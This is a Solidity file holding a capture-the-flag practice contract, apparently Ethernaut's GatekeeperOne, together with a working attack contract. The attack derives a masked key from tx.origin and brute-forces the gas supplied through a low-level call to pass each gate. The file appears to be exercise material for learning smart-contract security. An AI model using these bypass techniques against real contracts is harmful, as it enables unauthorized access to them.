// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGatekeeperOne {
    address public victim;
    bytes8 key;

    // Tha mask below passes gateThree modifier
    constructor(address _victim) public {
        victim = _victim;
        key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    }

    function enter() public returns (bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);

        uint256 approximateGasTarget = 254;
        uint256 padding = 30;

        // Brute force transaction using call method, which won't revert
        for (uint256 i = 0; i < padding * 2; i++) {
            (bool result, bytes memory data) = victim.call.gas(
                i + (approximateGasTarget - padding) + 8191 * 3
            )(payload);
            if (result) {
                break;
            }
        }
    }
}
